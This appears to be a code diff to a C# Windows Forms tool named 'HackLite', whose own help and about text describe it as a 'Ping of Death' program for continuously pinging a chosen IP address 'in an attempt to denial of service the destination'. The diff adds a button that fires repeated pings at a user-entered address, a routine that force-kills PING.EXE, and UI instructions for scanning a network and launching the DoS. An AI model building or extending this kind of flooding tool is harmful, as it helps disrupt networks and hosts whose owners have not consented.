@@ -300,10 +300,7 @@ namespace HackLite
             var tcs = new TaskCompletionSource<PingReply>();
             Ping ping = new Ping();
             string data = "a";
-            string strCmdText;
-            
-            
-
+           
             for (int i = 0; i<counter; i++)
             {
                 data += "a";
@@ -319,14 +316,32 @@ namespace HackLite
             cmdping.Start();
             int timeout = 10000;
             PingReply reply = ping.Send(address, timeout, buffer);
-            dataGridView2.Rows.Add(reply.Address, reply.Buffer.Length);
             ping.PingCompleted += (obj, sender) =>
             {
-                if (reply.Status == IPStatus.Success)
+                if (reply.Status == IPStatus.Success) {
+                    if (tabControl1.SelectedTab == tabPage2)
+                    {
+                        dataGridView2.Rows.Add(sender.Reply.Address, counter);
+                    }
+                    else
+                    {
+                        dataGridView3.Rows.Add(sender.Reply.Address, counter);
+                    }
+
+                    tcs.SetResult(sender.Reply);
+                }
+                else
+                {
+                    if (tabControl1.SelectedTab == tabPage2)
+                    {
+                        dataGridView2.Rows.Add(Saved_Address, "Request timed out");
+                    }
+                    else
+                    {
+                        dataGridView3.Rows.Add(sender.Reply.Address, "Request timed out");
+                    }
+                }
                     
-                    
-                    
-                tcs.SetResult(sender.Reply);
             };
             ping.SendAsync(address, new object());
             return tcs.Task;
@@ -368,39 +383,12 @@ namespace HackLite
             }
         }
 
-        public static void LocalPingTimeout()
-        {
-            // Ping's the local machine.
-            Ping pingSender = new Ping();
-            IPAddress address = IPAddress.Loopback;
-
-            // Create a buffer of 32 bytes of data to be transmitted.
-            string data = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
-            byte[] buffer = Encoding.ASCII.GetBytes(data);
-
-            // Wait 10 seconds for a reply.
-            int timeout = 10000;
-            PingReply reply = pingSender.Send(address, timeout, buffer);
-
-            if (reply.Status == IPStatus.Success)
-            {
-                Console.WriteLine("Address: {0}", reply.Address.ToString());
-                Console.WriteLine("RoundTrip time: {0}", reply.RoundtripTime);
-                Console.WriteLine("Time to live: {0}", reply.Options.Ttl);
-                Console.WriteLine("Don't fragment: {0}", reply.Options.DontFragment);
-                Console.WriteLine("Buffer size: {0}", reply.Buffer.Length);
-            }
-            else
-            {
-                Console.WriteLine(reply.Status);
-            }
-        }
-
 
         private void BtnPoison_Click(object sender, EventArgs e)
         {
          for (int i = 0; i < 1; i++)
             {
+      
                 Ping(Saved_Address);
             }
         }
@@ -413,7 +401,7 @@ namespace HackLite
             Saved_Address = dataGridView1.Rows[rowIndex].Cells[0].Value.ToString();
         }
 
-        private void btnKillPing_Click(object sender, EventArgs e)
+        public static void kill_ping()
         {
             System.Diagnostics.Process killPing = new System.Diagnostics.Process();
             System.Diagnostics.ProcessStartInfo killInfo = new System.Diagnostics.ProcessStartInfo();
@@ -423,6 +411,39 @@ namespace HackLite
             killInfo.Arguments = ("/IM PING.EXE /F");
             killPing.StartInfo = killInfo;
             killPing.Start();
+            MessageBox.Show("Ping.Exe Killed");
+        }
+
+        private void btnKillPing_Click(object sender, EventArgs e)
+        {
+            kill_ping();
+        }
+
+     
+
+        private void guideToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            MessageBox.Show("First Select a NIC and press the Red pill, the blue pill will exit, then Select Ping of Death scan the network for an ip address to select then click begin DOS, when Exiting Dont forget to Kill processes");
+        }
+
+        private void aboutUsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            MessageBox.Show("This Program allows you to continous Ping the Desinated IP Address in an attempt to denial of service the destination");
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            for (int i = 0; i < 20; i++)
+            {
+        
+                string targetAddress = txtEnterIP.Text;
+                Ping(targetAddress);
+            }
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            kill_ping();
         }
     }
 }
